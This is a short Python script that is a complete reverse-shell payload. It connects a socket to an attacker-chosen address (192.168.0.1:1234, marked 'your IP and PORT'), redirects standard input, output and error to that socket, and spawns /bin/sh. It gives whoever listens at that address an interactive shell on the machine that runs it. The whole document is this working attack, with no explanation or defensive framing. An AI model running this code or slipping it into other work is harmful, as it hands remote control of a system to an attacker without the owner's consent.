import socket,os,pty;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);

s.connect(("192.168.0.1",1234)); #your IP and PORT

os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

pty.spawn("/bin/sh")
